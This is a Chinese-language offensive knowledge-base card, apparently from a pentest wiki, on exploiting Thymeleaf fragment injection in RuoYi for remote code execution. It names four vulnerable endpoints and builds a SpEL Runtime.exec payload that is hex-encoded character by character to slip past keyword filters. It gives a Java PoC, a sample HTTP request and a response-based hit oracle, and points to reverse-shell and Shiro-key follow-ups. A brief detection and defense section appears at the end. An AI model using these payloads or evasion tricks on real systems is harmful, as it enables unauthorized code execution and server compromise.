---
id: web-java-expression-spel-ruoyi-thymeleaf-fragment-four-endpoint-hex-probe
title: RuoYi Thymeleaf 片段注入的四个入口与逐字符 %hex 编码投递：用 header() 包裹 SpEL、以响应含端点名作为黑盒命中 oracle
type: scenario
domain: web
path: web/java/expression/spel
technique: thymeleaf-fragment-multi-endpoint-hex-encoded-probe
tags:
- ssti
- thymeleaf
- spel
- ruoyi
- java
- blackbox
- payload-encoding
- rce
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-09'
updated: '2026-11-09'
verification:
  verified_by: verifier-T2-3W8
  verified_at: '2026-11-09T02:39:30+08:00'
  notes: 已对照原文核对：ThymeleafExp.check() 中载荷拼装 (\)、逐字符 '%'+Integer.toHexString(c) 全量编码、四个候选入口 /monitor/cache/getNames|getKeys|getValue 与 /demo/form/localrefresh/task 均以 header(<encoded>) 作为 fragment、命中判定为响应 contains('getNames'/'getKeys'/'getValue'/'task')，与正文 Java 代码块一致。本次核对未读取图片；原文未给出任何对真实目标的请求/响应截图，故『四个入口在实机均可用』未验证，卡内 header() 语境解释与 {} 叠加建议属依据关联卡的合理推断。dedup：t2_card 判 duplicate 但 top 为草稿自身（1.000），排除后最高外部候选 web-java-expression-spel-ruoyi-thymeleaf-fragment-ssti 0.214（同一 sink，但那张核心是 \$\$ 双写绕 containsExpression + 读 Shiro cipherKey，版本 4.8.1/4.8.2；本卡是入口枚举+全量 %hex 投递+端点名 oracle），非同一条链，判重说明成立
url: /docs/web/java/expression/spel/web-java-expression-spel-ruoyi-thymeleaf-fragment-four-endpoint-hex-probe/
draft: false
kb_aliases:
- RuoYi thymeleaf 批量探测
- /monitor/cache/getNames fragment 注入
- header() SpEL 包裹
- 逐字符 hex 编码 payload
- Thymeleaf 片段注入入口枚举
---

## 一句话结论

RuoYi 的 Thymeleaf 片段注入不止 `/monitor/cache/getNames` 一处：`/monitor/cache/getKeys`、`/monitor/cache/getValue`、`/demo/form/localrefresh/task` 同样是「把 `fragment` 拼进返回的视图名」的入口；把 SpEL 载荷用 `header(...)` 包裹、再对**每个字符**做 `%<hex>` 编码（而不是只编码特殊字符），既可躲过明文关键字匹配，又能让同一个载荷在四个入口间原样复用，命中判定则用「响应体里出现了该端点自己的方法名」这一极低误报的 oracle。

## 原理

- **为什么同一个参数能在多个端点复用**：这几处控制器都是把用户可控的 `fragment` 直接接到 `prefix + "/cache::" + fragment`（`/demo/form/localrefresh/task` 同理）后作为视图名返回，Spring/Thymeleaf 会把 `模板名 :: 片段选择器` 里的选择器当表达式解析。sink 相同 → 载荷相同 → 只需枚举入口。
- **`header(...)` 包裹的作用**：把整段 SpEL 放进 Thymeleaf 的 `header(...)` 片段函数调用位置，使它落在"片段选择器表达式"的求值上下文里；同时路径/参数形态看起来仍像一个正常的片段选择请求，降低被简单规则命中的概率。
- **`T (java.lang.Runtime)` 中间的空格**：`T` 与 `(` 之间插空格，绕的是「检测 `T(` / `new ` 这类实例化、静态访问的字符串扫描」——扫描器匹配的是连续字符，语义上 SpEL 仍把 `T (X)` 解析为类引用。
- **为什么逐字符 `%<hex>` 编码**：`%` + `Integer.toHexString(c)` 对每个字符逐一编码（包括字母、括号、点号），整个 payload 里不再出现 `T(`、`exec`、`getRuntime` 这类明文子串，能过掉基于明文关键字的 WAF/审计规则；服务端 URL 解码后恢复原文，语义不变。这比"只编码 `<>'"` 之类的常规做法更彻底，代价是 URL 变长、日志更显眼。
- **为什么用「响应含端点名」当 oracle**：这些接口正常渲染时会把自己的方法名（`getNames`/`getKeys`/`getValue`/`task`）带到响应里；一旦模板在拼接后的视图名上完成解析并走到渲染，响应就带上该名字。攻击者据此判断"这个入口的 fragment 真的进了模板引擎"，而不依赖命令回显——命令本身常常无回显（`Runtime.exec` 的返回值不回传）。
- **副作用提示**：`Runtime.exec` 起的是独立进程，父子关系与应用进程挂钩但标准输出不与 HTTP 响应相连，所以工具会明确提示"命令执行成功，无回显自行检查"。

## 触发条件

- 目标是 RuoYi（或其分支）且存在上述 `fragment` 直拼视图名的控制器；接口需要后台会话（本文工具要求先填 `url` + 有效 `Cookie`，配置有效性靠响应里是否出现 `<p>` 标签粗判）。
- 目标未对 `fragment` 做表达式白名单过滤（仅有明文关键字扫描时，`T (` 空格 + 逐字符编码即可绕过）。
- Thymeleaf 片段表达式未被禁用，SpEL 求值未使用受限上下文；若目标启用了 `containsExpression` 类检查，需要叠加 `$${}` 双写绕过（见关联卡）。
- 载荷中的命令要能在目标 OS 上执行（Windows 用 `calc`/`cmd /c`，Linux 用 `id`/`touch`），且执行结果靠带外或副作用确认。

## 利用步骤

1. 准备可用后台会话（`Cookie`），先请求一个已知页面确认会话有效，再逐个探测四个入口。
2. 构造载荷：`(${T (java.lang.Runtime).getRuntime().exec("<cmd>")})`，整体套进 `header(...)`。
3. 逐字符编码：对载荷每个字符输出 `%` + 该字符的十六进制（ASCII），拼成 `fragment=header(<encoded>)`。
4. 依次 POST 到 `/monitor/cache/getNames`、`/monitor/cache/getKeys`、`/monitor/cache/getValue`、`/demo/form/localrefresh/task`，对每个入口检查响应体是否包含该端点的方法名（`getNames`/`getKeys`/`getValue`/`task`）。
5. 命中的入口即为可用注入点；把命令换成可验证载荷（写文件、反连、DNS 带外）确认执行，因为默认命令无回显。
6. 若要回显，可改走 SpEL 里直接写 `response.getWriter()` 的路径（参见关联卡的 `#response` 用法），或读取 `@securityManager` 拿 Shiro `cipherKey` 走反序列化。

## PoC

```java
// 载荷构造与编码（工具中的核心逻辑）
String payload = "(${T (java.lang.Runtime).getRuntime().exec(\"" + cmd + "\")})";
String encoded = "";
for (char c : payload.toCharArray()) {
    encoded += "%" + Integer.toHexString(c);      // 逐字符 %hex，不留明文子串
}
String frag = "header(" + encoded + ")";

// 四个候选入口，任一响应含自身方法名即视为注入成立
String[] targets = {
    "/monitor/cache/getNames?fragment=" + frag,
    "/monitor/cache/getKeys?fragment=" + frag,
    "/monitor/cache/getValue?fragment=" + frag,
    "/demo/form/localrefresh/task?fragment=" + frag,
};
```

```http
POST /monitor/cache/getNames?fragment=header(%28%24%7b%54%20%28java.lang.Runtime%29...) HTTP/1.1
Host: target
Cookie: <后台会话>
Content-Type: application/x-www-form-urlencoded

```

```text
判定：响应体包含 "getNames" → 该入口 fragment 进入模板解析；
把命令换成写文件/反连载荷确认执行（exec 无回显）。
```

## 变体与关联

- 关联（同 sink，不同绕过）：`[[web-java-expression-spel-ruoyi-thymeleaf-fragment-ssti]]` 讲的是 `$${}` 双写绕过 `SpringRequestUtils#containsExpression` 并读 Shiro `cipherKey`（4.8.1/4.8.2，需 `monitor:cache:view` 权限，PoC 为 `__|$${...}|__` form 体）；本卡讲的是**入口枚举 + 逐字符编码投递 + 端点名 oracle**，不依赖 `$$` 双写、也不要求知道具体版本，两者可叠加使用。
- 关联（同绕过技巧）：`[[web-java-expression-spel-thymeleaf-312-typestatic-whitespace-bypass]]` 用 `T (` 空格绕 `containsSpelInstantiationOrStatic`；本卡把该技巧与整体编码结合用于批量探测。
- 变体：编码方式可换成 `%uXXXX`、双写 `%%`、或只编码关键字；入口可扩展到任何"用户输入拼进返回视图名"的控制器（`prefix + "/xxx::" + param`），审计时全局搜 `"::" +`。
- 边界：接口若被鉴权/CSRF 拦住则需先拿会话；若响应不包含端点名或统一错误页，oracle 失效，需改用延时/带外判定；`exec` 的进程可能在受限容器内无法外连，需换成写文件到可读目录。

## 检测与防御

- 检测：请求参数出现高密度 `%xx`（几乎每个字符都被编码）、且解码后含 `${`、`T`、`getRuntime`、`exec`、`header(`；同一会话在短时间内连续请求 `/monitor/cache/*` 与 `/demo/form/localrefresh/task` 等多个同类端点（入口枚举特征）；应用进程派生出 `calc`/`cmd`/`sh` 之类子进程。
- 防御：不要把用户输入拼进视图名/片段选择器（改为白名单枚举）；升级到禁用或限制片段表达式的版本；部署层对 URL 做一次规范化后按解码结果匹配关键字（不要只看原始 URL）；对 `Runtime`/`ProcessBuilder` 的调用加 RASP 拦截，并对后台接口做操作审计。
